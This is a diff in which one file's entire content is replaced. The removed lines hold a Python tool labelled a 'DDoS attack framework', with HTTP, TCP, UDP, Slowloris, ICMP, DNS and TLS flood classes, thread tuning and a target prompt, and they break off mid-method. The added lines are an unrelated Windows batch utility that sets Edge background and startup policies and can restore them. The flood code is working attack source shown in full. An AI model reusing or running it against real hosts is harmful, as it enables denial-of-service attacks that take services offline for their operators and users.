@@ -1,976 +1,1043 @@
-#!/usr/bin/env python3
-import os, sys, platform, socket, threading, time, json, random, struct, subprocess, atexit
-from pathlib import Path
-from typing import Optional, Dict, List
+@echo off
+setlocal EnableExtensions DisableDelayedExpansion
+title Edge Isolation
 
-# ============================================================================
-# COLORS - CROSS PLATFORM
-# ============================================================================
+:: ======================================================================
+:: EDGE ISOLATION - manual, on-demand utility.
+:: Runs only when you start it. Creates no scheduled task, service,
+:: startup entry, watcher or background process, and exits when done.
+::
+:: PURPOSE  Stop the Edge BROWSER from running in the background and from
+::          starting at sign-in. The WebView2 Runtime is never modified.
+::
+:: APPLY    1. Policy StartupBoostEnabled = 0      (REG_DWORD)
+::          2. Policy BackgroundModeEnabled = 0    (REG_DWORD)
+::             both in HKLM\SOFTWARE\Policies\Microsoft\Edge, only when
+::             the value is not configured yet. A different existing value
+::             is treated as managed by someone else and left alone.
+::          3. Edge auto-launch entries (MicrosoftEdgeAutoLaunch*) found in
+::             the Run keys are switched OFF in StartupApproved, the same
+::             switch Task Manager > Startup apps uses. Run values are NOT
+::             deleted.
+::          Before each change the original state is recorded in
+::          HKLM\SOFTWARE\EdgeIsolationTool (and HKCU\Software\...). That is
+::          the only thing this tool keeps. Restore uses it.
+::
+:: NEVER    WebView2 Runtime, msedgewebview2.exe, Edge Update services and
+::          scheduled tasks (one shared updater serves Edge AND WebView2),
+::          Run values, other policies, unrelated startup items.
+::          Edge processes are only closed when you answer Y, and only
+::          main Edge browser processes that have no window.
+::
+:: COMMANDS (none = menu)
+::   /apply /status /check /update /restore  [/silent] [/plain]
+::   /silent  no prompts, no pauses, plain text      /plain  no colors
+::
+:: EXIT CODES
+::   0 ok / compliant        1 failed, or still not compliant
+::   2 winget unavailable    3 WebView2 update or check failed/unverified
+::   4 no admin rights       5 invalid usage
+::   10 (/check only) a WebView2 update is available
+:: ======================================================================
 
-class C:
-    def __init__(self):
-        self.use = platform.system() != "Windows"
-        if platform.system() == "Windows":
-            try:
-                import ctypes
-                k32 = ctypes.windll.kernel32
-                h = k32.GetStdHandle(-11)
-                m = ctypes.c_ulong()
-                k32.GetConsoleMode(h, ctypes.byref(m))
-                m.value |= 0x0004
-                k32.SetConsoleMode(h, m)
-                self.use = True
-            except: pass
-    
-    def c(self, t, code):
-        return f"\033[{code}m{t}\033[0m" if self.use else t
-    
-    def r(self, t): return self.c(t, "91")
-    def g(self, t): return self.c(t, "92")
-    def y(self, t): return self.c(t, "93")
-    def c_(self, t): return self.c(t, "96")
-    def m(self, t): return self.c(t, "95")
-    def b(self, t): return self.c(t, "1")
+:: ------------------------------ CONFIG --------------------------------
+set "P_EDGE=HKLM\SOFTWARE\Policies\Microsoft\Edge"
+set "POLICIES=StartupBoostEnabled BackgroundModeEnabled"
+set "SVC_ROOT=HKLM\SYSTEM\CurrentControlSet\Services"
+set "UPDATE_SVCS=edgeupdate edgeupdatem MicrosoftEdgeElevationService"
 
-C = C()
+set "RUN_U=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+set "RUN_M=HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
+set "RUN_M32=HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
+set "APPR_U=HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
+set "APPR_M=HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
+set "APPR_M32=HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32"
+set "APPR_OFF=030000000000000000000000"
 
-def clear(): os.system("cls" if platform.system() == "Windows" else "clear")
-def inp(p): return input(C.y(p)).strip()
-def log_i(m): print(C.g(f"[+] {m}"))
-def log_e(m): print(C.r(f"[!] {m}"))
-def log_w(m): print(C.y(f"[*] {m}"))
-def log_ok(m): print(C.g(f"[✓] {m}"))
-def log_m(m): print(C.c_(f"[M] {m}"))
+:: Recorded original state (REG_SZ values). HKLM is writable by admins only.
+set "ST_M=HKLM\SOFTWARE\EdgeIsolationTool"
+set "ST_U=HKCU\Software\EdgeIsolationTool"
 
-def rand_str(n): return ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(n))
-def rand_ip(): return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
-def rand_ua(): return random.choice([
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-])
+set "GUID_EDGE={56EB18F8-B008-4CBD-B6D2-8C97FE7E9062}"
+set "GUID_WV2={F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}"
+set "WV2_ID=Microsoft.EdgeWebView2Runtime"
 
-# ============================================================================
-# CONFIG - THREAD-SAFE GLOBAL STATE
-# ============================================================================
+set "RC=0"
+set "SILENT="
+set "PLAIN="
+set "ELEV="
+set "ACTION="
+set "SID_ORIG="
+set "MENUMODE="
+set "ARGS=%*"
+set "ARGS_PS="
+set "SELF=%~f0"
+set "SELF_PS=%SELF:'=''%"
+if defined ARGS set "ARGS_PS=%ARGS:'=''%"
+call :reset
 
-class Cfg:
-    def __init__(self):
-        self.ip = ""
-        self.port = 80
-        self.path = "/"
-        self.proto = "http"
-        self.method = ""
-        self.threads = 3000
-        self.duration = 0
-        
-        # Lock-protected metrics
-        self.lock = threading.Lock()
-        self.packets = 0
-        self.bytes = 0
-        self.start = 0
-        self.running = False
-        self.active_threads = 0
-        
-        # Performance tuning
-        self.payload_sz = 8192
-        self.batch = 2000
-        self.timeout = 2
-        self.buf_sz = 67108864
-        self.rand_ports = True
-        
-        self.cfg = Path("config.json")
-        self.load()
-    
-    def load(self):
-        if self.cfg.exists():
-            try:
-                with open(self.cfg) as f:
-                    d = json.load(f)
-                    if 'threads' in d: self.threads = d['threads']
-                    if 'duration' in d: self.duration = d['duration']
-                    if 'payload_sz' in d: self.payload_sz = d['payload_sz']
-                    if 'batch' in d: self.batch = d['batch']
-                    if 'timeout' in d: self.timeout = d['timeout']
-            except: pass
-    
-    def save(self):
-        try:
-            with open(self.cfg, 'w') as f:
-                json.dump({
-                    'threads': self.threads,
-                    'duration': self.duration,
-                    'payload_sz': self.payload_sz,
-                    'batch': self.batch,
-                    'timeout': self.timeout,
-                }, f)
-        except: pass
-    
-    def inc_p(self, n=1):
-        with self.lock:
-            self.packets += n
-    
-    def inc_b(self, n):
-        with self.lock:
-            self.bytes += n
-    
-    def add_thread(self):
-        with self.lock:
-            self.active_threads += 1
-    
-    def remove_thread(self):
-        with self.lock:
-            self.active_threads = max(0, self.active_threads - 1)
-    
-    def metrics(self):
-        with self.lock:
-            elapsed = max(time.time() - self.start, 0.1) if self.start else 0.1
-            pps = self.packets / elapsed if elapsed > 0 else 0
-            mbps = (self.bytes * 8 / 1_000_000) / elapsed if elapsed > 0 else 0
-            return {
-                'packets': self.packets,
-                'bytes': self.bytes,
-                'pps': pps,
-                'mbps': mbps,
-                'elapsed': elapsed,
-                'active': self.active_threads
-            }
+:: ----------------------------- ARGUMENTS ------------------------------
+:: SHIFT is used instead of FOR: in FOR, the ? in /? is a wildcard and the
+:: argument would be dropped silently.
+:arg_loop
+if "%~1"=="" goto arg_done
+call :parse_arg "%~1"
+shift
+goto arg_loop
+:arg_done
+call :ui_init
 
-CFG = Cfg()
+if /I "%ACTION%"=="/?" goto HELP
+if /I "%ACTION%"=="/help" goto HELP
+if not defined ACTION (
+    if defined SILENT goto USAGE
+) else (
+    set "VALID="
+    for %%V in (/apply /status /check /update /restore) do if /I "%ACTION%"=="%%V" set "VALID=1"
+    if not defined VALID goto USAGE
+)
 
-# ============================================================================
-# TARGET RESOLVER
-# ============================================================================
+:: ----------------------- 64-BIT REGISTRY VIEW -------------------------
+:: A 32-bit cmd.exe on 64-bit Windows silently redirects HKLM\SOFTWARE to the
+:: 32-bit view. Edge would never see the policies, yet read-back would still
+:: pass, so the tool would report a success that has no effect.
+if defined PROCESSOR_ARCHITEW6432 (
+    call :fail "32-bit Command Prompt on 64-bit Windows, registry changes would go to the wrong place"
+    call :note "Start this file from the normal 64-bit Command Prompt or by double-clicking it."
+    set "RC=1"
+    goto END
+)
 
-class Resolve:
-    @staticmethod
-    def parse(target):
-        target = target.strip()
-        if not target:
-            return None
-        
-        if not target.startswith(('http://', 'https://')):
-            target = 'http://' + target
-        
-        try:
-            proto = 'https' if target.startswith('https://') else 'http'
-            target = target[8:] if proto == 'https' else target[7:]
-            
-            if '/' in target:
-                hostport, path = target.split('/', 1)
-                path = '/' + path
-            else:
-                hostport = target
-                path = '/'
-            
-            if ':' in hostport:
-                host, port_str = hostport.rsplit(':', 1)
-                try:
-                    port = int(port_str)
-                except ValueError:
-                    return None
-            else:
-                host = hostport
-                port = 443 if proto == 'https' else 80
-            
-            if not host:
-                return None
-            
-            if port < 1 or port > 65535:
-                log_e("Port must be 1-65535")
-                return None
-            
-            try:
-                ip = socket.gethostbyname(host)
-                log_i(f"Resolved {host} → {ip}")
-            except socket.gaierror:
-                log_e(f"Cannot resolve {host}")
-                return None
-            
-            return {'ip': ip, 'port': port, 'host': host, 'path': path, 'proto': proto}
-        except Exception as e:
-            log_e(f"Parse error: {str(e)}")
-            return None
+:: ------------------------ ADMINISTRATOR RIGHTS ------------------------
+:: /status and /check are read-only and need no elevation.
+set "NEEDADMIN=1"
+if /I "%ACTION%"=="/status" set "NEEDADMIN="
+if /I "%ACTION%"=="/check" set "NEEDADMIN="
+if not defined NEEDADMIN goto START
+fltmc >nul 2>&1
+if not errorlevel 1 goto START
+if defined ELEV (
+    call :fail "Administrator rights could not be obtained"
+    set "RC=4"
+    call :wait_key "Press any key to close this window..."
+    goto END
+)
+call :get_sid SID_ORIG
+call :info "Administrator rights needed, requesting elevation"
+if defined SILENT goto ELEVATE_WAIT
+powershell.exe -NoProfile -Command "try { Start-Process -FilePath '%SELF_PS%' -ArgumentList '%ARGS_PS% /elevated /sid:%SID_ORIG%' -Verb RunAs } catch { exit 4 }" >nul 2>&1
+set "RC=%errorlevel%"
+if not "%RC%"=="0" call :fail "Elevation was cancelled or failed"
+if not "%RC%"=="0" call :wait_key "Press any key to close this window..."
+goto END
 
-# ============================================================================
-# SOCKET UTILITIES - SAFE LIFECYCLE MANAGEMENT
-# ============================================================================
+:ELEVATE_WAIT
+powershell.exe -NoProfile -Command "try { $p = Start-Process -FilePath '%SELF_PS%' -ArgumentList '%ARGS_PS% /elevated /sid:%SID_ORIG%' -Verb RunAs -Wait -PassThru; exit $p.ExitCode } catch { exit 4 }" >nul 2>&1
+set "RC=%errorlevel%"
+goto END
 
-def create_socket():
-    """Create and configure socket with max buffers"""
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    try:
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, CFG.buf_sz)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, CFG.buf_sz)
-        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        sock.settimeout(CFG.timeout)
-    except:
-        pass
-    return sock
+:: ------------------------------- START --------------------------------
+:START
+:: Per-user (HKCU) settings only make sense if the elevated account is the
+:: same account that started the tool.
+call :get_sid CUR_SID
+set "HKCU_OK=1"
+if defined SID_ORIG if /I not "%SID_ORIG%"=="%CUR_SID%" set "HKCU_OK="
+if not defined ACTION goto MENU
+call :act_%ACTION:/=%
+if defined ELEV call :wait_key "Press any key to close this window..."
+goto END
 
-def safe_close(sock):
-    """Safe socket close with error suppression"""
-    if sock:
-        try:
-            sock.shutdown(socket.SHUT_RDWR)
-        except:
-            pass
-        try:
-            sock.close()
-        except:
-            pass
+:: ------------------------------- MENU ---------------------------------
+:MENU
+set "MENUMODE=1"
+call :clear
+call :title "Edge Isolation"
+call :menu_state
+echo.
+echo     %C_CY%1%C_R%   Apply Edge isolation
+echo     %C_CY%2%C_R%   Check current configuration
+echo     %C_CY%3%C_R%   Check for a WebView2 Runtime update
+echo     %C_CY%4%C_R%   Update WebView2 Runtime
+echo     %C_CY%5%C_R%   Restore settings changed by this tool
+echo     %C_CY%6%C_R%   Exit
+echo.
+choice /c 123456 /n /m "  Select [1-6]: "
+set "SEL=%errorlevel%"
+if "%SEL%"=="6" goto MENU_EXIT
+if "%SEL%"=="1" call :panel act_apply
+if "%SEL%"=="2" call :panel act_status
+if "%SEL%"=="3" call :panel act_check
+if "%SEL%"=="4" call :panel act_update
+if "%SEL%"=="5" call :panel act_restore
+if %SEL% GEQ 1 if %SEL% LEQ 5 goto MENU
 
-# ============================================================================
-# ATTACK VECTORS - BULLETPROOF
-# ============================================================================
+:: choice failed or input was closed: leave instead of redrawing forever
+:MENU_EXIT
+set "RC=0"
+goto END
 
-class Vector:
-    def __init__(self):
-        self.cfg = CFG
-        self.running = False
-    
-    def start(self):
-        """Start attack threads"""
-        with self.cfg.lock:
-            self.cfg.packets = 0
-            self.cfg.bytes = 0
-            self.cfg.start = time.time()
-            self.cfg.running = True
-            self.cfg.active_threads = 0
-        
-        self.running = True
-        threads = []
-        
-        for i in range(self.cfg.threads):
-            t = threading.Thread(target=self._exec_wrapper, args=(i,), daemon=True)
-            t.start()
-            threads.append(t)
-            time.sleep(0.001)  # Stagger thread creation
-        
-        return threads
-    
-    def stop(self):
-        """Stop attack"""
-        self.running = False
-        with self.cfg.lock:
-            self.cfg.running = False
-    
-    def _exec_wrapper(self, tid):
-        """Wrapper to track active threads"""
-        self.cfg.add_thread()
-        try:
-            self.execute(tid)
-        finally:
-            self.cfg.remove_thread()
-    
-    def execute(self, tid):
-        """Override in subclass"""
-        pass
+:USAGE
+set "RC=5"
+:HELP
+echo.
+echo   Usage: edge-isolation.bat [/apply ^| /status ^| /check ^| /update ^| /restore] [/silent] [/plain]
+echo.
+echo     no argument   interactive menu
+echo     /status       read-only configuration report, no admin needed
+echo     /apply        isolate the Edge browser
+echo     /restore      undo what this tool recorded
+echo     /check        look for a WebView2 Runtime update, read-only
+echo     /update       update the WebView2 Runtime only
+echo     /silent       no prompts, no pauses, plain text
+echo     /plain        no colors
+echo.
+echo   Exit codes: 0 ok, 1 failed or not compliant, 2 winget missing,
+echo   3 update failed or unverified, 4 no admin rights, 5 bad usage,
+echo   10 update available ^(/check^)
+goto END
 
-class HTTPFlood(Vector):
-    def execute(self, tid):
-        sock = None
-        sent = 0
-        
-        try:
-            while self.running:
-                if CFG.duration > 0:
-                    with CFG.lock:
-                        if time.time() - CFG.start > CFG.duration:
-                            break
-                
-                # Reconnect every 300 requests or on socket error
-                if not sock or sent >= 300:
-                    safe_close(sock)
-                    sock = None
-                    sent = 0
-                    
-                    try:
-                        sock = create_socket()
-                        port = random.randint(50000, 65535) if CFG.rand_ports else CFG.port
-                        sock.connect((CFG.ip, port))
-                    except socket.error:
-                        sock = None
-                        time.sleep(0.01)
-                        continue
-                
-                if not sock:
-                    continue
-                
-                # Batch send
-                try:
-                    for _ in range(CFG.batch):
-                        if not self.running:
-                            break
-                        
-                        req = f"GET {CFG.path}?{rand_str(32)}={rand_str(32)} HTTP/1.1\r\n"
-                        req += f"Host: {CFG.ip}\r\n"
-                        req += f"User-Agent: {rand_ua()}\r\n"
-                        req += f"Connection: keep-alive\r\n"
-                        req += f"Cache-Control: no-cache\r\n"
-                        req += f"X-Forwarded-For: {rand_ip()}\r\n"
-                        req += f"Accept: */*\r\n"
-                        req += f"Accept-Encoding: gzip\r\n\r\n"
-                        
-                        b = req.encode()
-                        sock.sendall(b)
-                        CFG.inc_p(1)
-                        CFG.inc_b(len(b))
-                        sent += 1
-                
-                except socket.error:
-                    safe_close(sock)
-                    sock = None
-                    sent = 0
-        
-        except:
-            pass
-        finally:
-            safe_close(sock)
+:END
+endlocal & exit /b %RC%
 
-class TCPFlood(Vector):
-    def execute(self, tid):
-        try:
-            while self.running:
-                if CFG.duration > 0:
-                    with CFG.lock:
-                        if time.time() - CFG.start > CFG.duration:
-                            break
-                
-                # Create batch of connections
-                for _ in range(CFG.batch):
-                    if not self.running:
-                        break
-                    
-                    sock = None
-                    try:
-                        sock = create_socket()
-                        port = random.randint(50000, 65535) if CFG.rand_ports else CFG.port
-                        
-                        sock.connect((CFG.ip, port))
-                        
-                        payload = os.urandom(CFG.payload_sz)
-                        sock.sendall(payload)
-                        
-                        CFG.inc_p(1)
-                        CFG.inc_b(len(payload))
-                    except socket.error:
-                        CFG.inc_p(1)
-                    finally:
-                        safe_close(sock)
-        
-        except:
-            pass
+:: ======================================================================
+:: ACTIONS
+:: ======================================================================
+:act_apply
+call :reset
+call :title "Apply Edge isolation"
+if defined MENUMODE (
+    call :note "Sets two Edge policies and switches off Edge auto-start entries."
+    call :note "Update services, tasks and WebView2 are not touched. Restore can undo this."
+    echo.
+    choice /c YN /n /m "  Proceed? [Y/N] "
+    if errorlevel 2 (
+        set "NOWAIT=1"
+        exit /b 0
+    )
+)
+call :do_apply
+exit /b 0
 
-class UDPFlood(Vector):
-    def execute(self, tid):
-        sock = None
-        
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, CFG.buf_sz)
-            sock.settimeout(CFG.timeout)
-            
-            while self.running:
-                if CFG.duration > 0:
-                    with CFG.lock:
-                        if time.time() - CFG.start > CFG.duration:
-                            break
-                
-                try:
-                    for _ in range(CFG.batch):
-                        if not self.running:
-                            break
-                        
-                        payload = os.urandom(CFG.payload_sz)
-                        port = random.randint(50000, 65535) if CFG.rand_ports else CFG.port
-                        
-                        sock.sendto(payload, (CFG.ip, port))
-                        CFG.inc_p(1)
-                        CFG.inc_b(len(payload))
-                except socket.error:
-                    pass
-        
-        except:
-            pass
-        finally:
-            safe_close(sock)
+:act_status
+call :reset
+call :do_status
+exit /b 0
 
-class Slowloris(Vector):
-    def execute(self, tid):
-        socks = []
-        
-        try:
-            while self.running:
-                if CFG.duration > 0:
-                    with CFG.lock:
-                        if time.time() - CFG.start > CFG.duration:
-                            break
-                
-                # Add new connections
-                while len(socks) < 100 and self.running:
-                    try:
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(120)
-                        sock.connect((CFG.ip, CFG.port))
-                        
-                        req = f"GET {CFG.path} HTTP/1.1\r\nHost: {CFG.ip}\r\nConnection: keep-alive\r\n"
-                        sock.sendall(req.encode())
-                        
-                        socks.append(sock)
-                        CFG.inc_p(1)
-                    except socket.error:
-                        break
-                
-                # Send keep-alive headers on all
-                dead = []
-                for sock in socks:
-                    try:
-                        header = f"X-{rand_str(16)}: {rand_str(32)}\r\n"
-                        sock.sendall(header.encode())
-                        CFG.inc_p(1)
-                    except socket.error:
-                        dead.append(sock)
-                
-                # Clean dead sockets
-                for sock in dead:
-                    socks.remove(sock)
-                    safe_close(sock)
-                
-                time.sleep(0.1)
-        
-        except:
-            pass
-        finally:
-            for sock in socks:
-                safe_close(sock)
+:act_check
+call :reset
+call :title "WebView2 Runtime update check"
+call :head "WebView2 Runtime"
+call :do_check
+exit /b 0
 
-class ICMPFlood(Vector):
-    def execute(self, tid):
-        try:
-            while self.running:
-                if CFG.duration > 0:
-                    with CFG.lock:
-                        if time.time() - CFG.start > CFG.duration:
-                            break
-                
-                for _ in range(CFG.batch):
-                    if not self.running:
-                        break
-                    
-                    try:
-                        if platform.system() == "Windows":
-                            subprocess.Popen(
-                                ['ping', '-n', '1', '-w', '1', CFG.ip],
-                                stdout=subprocess.DEVNULL,
-                                stderr=subprocess.DEVNULL,
-                                creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
-                            )
-                        else:
-                            subprocess.Popen(
-                                ['ping', '-c', '1', '-W', '1', CFG.ip],
-                                stdout=subprocess.DEVNULL,
-                                stderr=subprocess.DEVNULL
-                            )
-                        CFG.inc_p(1)
-                        CFG.inc_b(56)
-                    except:
-                        CFG.inc_p(1)
-        
-        except:
-            pass
+:act_update
+call :reset
+call :title "Update WebView2 Runtime"
+if defined MENUMODE (
+    call :note "Updates only the WebView2 Runtime, through winget. The Edge browser is not updated."
+    echo.
+    choice /c YN /n /m "  Update now? [Y/N] "
+    if errorlevel 2 (
+        set "NOWAIT=1"
+        exit /b 0
+    )
+)
+call :head "WebView2 Runtime"
+call :do_update
+exit /b 0
 
-class DNSFlood(Vector):
-    def execute(self, tid):
-        sock = None
-        
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, CFG.buf_sz)
-            sock.settimeout(CFG.timeout)
-            
-            while self.running:
-                if CFG.duration > 0:
-                    with CFG.lock:
-                        if time.time() - CFG.start > CFG.duration:
-                            break
-                
-                try:
-                    for _ in range(CFG.batch):
-                        if not self.running:
-                            break
-                        
-                        qid = random.randint(1, 65535)
-                        query = struct.pack('>H', qid) + b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
-                        query += b'\x07example\x03com\x00\x00\xff\x00\x01'
-                        
-                        sock.sendto(query, (CFG.ip, 53))
-                        CFG.inc_p(1)
-                        CFG.inc_b(len(query))
-                except socket.error:
-                    pass
-        
-        except:
-            pass
-        finally:
-            safe_close(sock)
+:act_restore
+call :reset
+call :title "Restore settings changed by this tool"
+if defined MENUMODE (
+    call :note "Puts back only what this tool recorded when it applied isolation."
+    echo.
+    choice /c YN /n /m "  Restore now? [Y/N] "
+    if errorlevel 2 (
+        set "NOWAIT=1"
+        exit /b 0
+    )
+)
+call :head "Recorded changes"
+call :do_restore
+exit /b 0
 
-class SSLFlood(Vector):
-    def execute(self, tid):
-        try:
-            import ssl
-        except ImportError:
-            return
-        
-        try:
-            while self.running:
-                if CFG.duration > 0:
-                    with CFG.lock:
-                        if time.time() - CFG.start > CFG.duration:
-                            break
-                
-                sock = None
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(CFG.timeout)
-                    
-                    ctx = ssl.create_default_context()
-                    ctx.check_hostname = False
-                    ctx.verify_mode = ssl.CERT_NONE
-                    
-                    ssl_sock = ctx.wrap_socket(sock, server_hostname=CFG.ip)
-                    ssl_sock.connect((CFG.ip, CFG.port))
-                    
-                    for _ in range(5):
-                        try:
-                            ssl_sock.do_handshake()
-                            CFG.inc_p(1)
-                        except:
-                            break
-                    
-                    safe_close(ssl_sock)
-                except (socket.error, ssl.SSLError):
-                    if sock:
-                        safe_close(sock)
-        
-        except:
-            pass
+:: ======================================================================
+:: APPLY
+:: ======================================================================
+:do_apply
+set "MODE=apply"
+call :read_both
+call :head "Edge browser policies"
+if "%EDGE_V%"=="not found" call :info "Edge browser not found in the registry, settings are applied anyway"
+call :inspect_policies
+call :head "Startup entries"
+call :inspect_startup
+call :head "Edge processes"
+call :proc_apply
+call :info "Edge update services and tasks left unchanged, shared with WebView2"
+set /a CHG_RUN=CHG
+set /a NC=0
+set "QUIET=1"
+set "MODE=audit"
+call :inspect_policies
+call :inspect_startup
+set "QUIET="
+if %FAILS% GTR 0 (
+    call :result fail "Failed operations: %FAILS%, settings not compliant: %NC%"
+    call :setrc 1
+    exit /b 0
+)
+if %NC% GTR 0 (
+    call :result warn "Settings not compliant: %NC%, see above"
+    call :setrc 1
+    exit /b 0
+)
+if %CHG_RUN% GTR 0 (
+    call :result ok "Isolation applied and verified, changes made: %CHG_RUN%. Restart Edge if it is open"
+) else (
+    call :result ok "Already compliant, nothing changed"
+)
+exit /b 0
 
-class Multi(Vector):
-    def execute(self, tid):
-        vectors = [HTTPFlood, TCPFlood, UDPFlood, Slowloris, DNSFlood]
-        vec_class = random.choice(vectors)
-        vec = vec_class()
-        vec.running = self.running
-        vec.cfg = self.cfg
-        vec.execute(tid)
+:: policy_item <name>   mode apply: set if absent / status, audit: report
+:policy_item
+call :reg_get "%P_EDGE%" %~1 PV
+if not defined PV goto pi_absent
+if /I "%RG_T%"=="REG_DWORD" if "%PV%"=="0x0" goto pi_ok
+call :warn "%~1 = %PV% of type %RG_T% set by an existing policy, not changed"
+set /a NC+=1
+exit /b 0
 
-# ============================================================================
-# INTERACTIVE MENU
-# ============================================================================
+:pi_ok
+call :ok "%~1 = 0, policy configured"
+exit /b 0
 
-class Menu:
-    def __init__(self):
-        self.vector = None
-        self.threads = []
-    
-    def banner(self):
-        clear()
-        print(C.b(C.m("""
-╔════════════════════════════════════════════════════════╗
-║         BRUTEFORCE DDoS ATTACK FRAMEWORK               ║
-║  Maximum Throughput | Multiple Vectors | Raw Power    ║
-║  Windows • Linux • macOS • Kali • Parrot              ║
-╚════════════════════════════════════════════════════════╝
-        """)))
-    
-    def main(self):
-        while True:
-            self.banner()
-            print(C.c_("MAIN MENU"))
-            print("=" * 60)
-            print("1. Launch Attack")
-            print("2. View Settings")
-            print("3. Advanced Settings")
-            print("4. Save Settings")
-            print("5. Load Settings")
-            print("6. System Info")
-            print("7. Help")
-            print("0. Exit")
-            print("=" * 60)
-            
-            choice = inp("Select (0-7): ")
-            
-            if choice == "1":
-                self.attack()
-            elif choice == "2":
-                self.show_cfg()
-            elif choice == "3":
-                self.adv_menu()
-            elif choice == "4":
-                CFG.save()
-                log_ok("Settings saved")
-                input("")
-            elif choice == "5":
-                CFG.load()
-                log_ok("Settings loaded")
-                input("")
-            elif choice == "6":
-                self.sysinfo()
-            elif choice == "7":
-                self.help()
-            elif choice == "0":
-                log_i("Exiting...")
-                sys.exit(0)
-            else:
-                log_e("Invalid option")
-                input("")
-    
-    def attack(self):
-        clear()
-        print(C.c_("TARGET SETUP"))
-        print("=" * 60)
-        
-        while True:
-            target = inp("Enter target (IP:port or URL): ")
-            if not target:
-                log_e("Target required")
-                continue
-            
-            parsed = Resolve.parse(target)
-            if parsed:
-                CFG.ip = parsed['ip']
-                CFG.port = parsed['port']
-                CFG.path = parsed['path']
-                CFG.proto = parsed['proto']
-                log_ok(f"Target: {parsed['proto']}://{parsed['ip']}:{parsed['port']}{parsed['path']}")
-                break
-            else:
-                log_e("Invalid target")
-        
-        clear()
-        print(C.c_("SELECT ATTACK TYPE"))
-        print("=" * 60)
-        print("1. HTTP Flood (Layer 7)")
-        print("2. TCP Flood (Layer 4)")
-        print("3. UDP Flood (Layer 4)")
-        print("4. Slowloris (Connection Exhaustion)")
-        print("5. ICMP Flood (Layer 3)")
-        print("6. DNS Flood")
-        print("7. SSL/TLS Renegotiation")
-        print("8. Multi-Vector Attack")
-        print("=" * 60)
-        
-        attack_map = {
-            "1": ("HTTP Flood", HTTPFlood),
-            "2": ("TCP Flood", TCPFlood),
-            "3": ("UDP Flood", UDPFlood),
-            "4": ("Slowloris", Slowloris),
-            "5": ("ICMP Flood", ICMPFlood),
-            "6": ("DNS Flood", DNSFlood),
-            "7": ("SSL Flood", SSLFlood),
-            "8": ("Multi-Vector", Multi),
-        }
-        
-        while True:
-            choice = inp("Select attack (1-8): ")
-            if choice in attack_map:
-                CFG.method, self.vector = attack_map[choice]
-                log_ok(f"Attack: {CFG.method}")
-                break
-            else:
-                log_e("Invalid option")
-        
-        clear()
-        print(C.c_("PERFORMANCE TUNING"))
-        print("=" * 60)
-        
-        while True:
-            try:
-                threads = int(inp("Threads (100-20000) [default 3000]: ") or "3000")
-                if 100 <= threads <= 20000:
-                    CFG.threads = threads
-                    log_ok(f"Threads: {threads}")
-                    break
-                else:
-                    log_e("Must be 100-20000")
-            except ValueError:
-                log_e("Invalid number")
-        
-        while True:
-            try:
-                duration = int(inp("Duration in seconds (0=unlimited) [default 60]: ") or "60")
-                if 0 <= duration <= 10800:
-                    CFG.duration = duration
-                    dur_text = "Unlimited" if duration == 0 else f"{duration}s"
-                    log_ok(f"Duration: {dur_text}")
-                    break
-                else:
-                    log_e("Must be 0-10800")
-            except ValueError:
-                log_e("Invalid number")
-        
-        while True:
-            try:
-                batch = int(inp("Batch size (100-10000) [default 2000]: ") or "2000")
-                if 100 <= batch <= 10000:
-                    CFG.batch = batch
-                    log_ok(f"Batch size: {batch}")
-                    break
-                else:
-                    log_e("Must be 100-10000")
-            except ValueError:
-                log_e("Invalid number")
-        
-        self.summary()
-        
-        confirm = inp("Launch attack? (yes/no): ").lower()
-        if confirm in ["yes", "y"]:
-            self.run()
-        else:
-            log_e("Cancelled")
-            input("")
-    
-    def summary(self):
-        clear()
-        print(C.c_("ATTACK SUMMARY"))
-        print("=" * 60)
-        print(f"Target:      {C.y(CFG.ip)}:{C.y(str(CFG.port))}")
-        print(f"Protocol:    {C.y(CFG.proto.upper())}")
-        print(f"Attack Type: {C.y(CFG.method)}")
-        print(f"Threads:     {C.y(str(CFG.threads))}")
-        print(f"Duration:    {C.y('Unlimited' if CFG.duration == 0 else f'{CFG.duration}s')}")
-        print(f"Batch Size:  {C.y(str(CFG.batch))}")
-        print(f"Payload:     {C.y(str(CFG.payload_sz))} bytes")
-        print("=" * 60)
-    
-    def run(self):
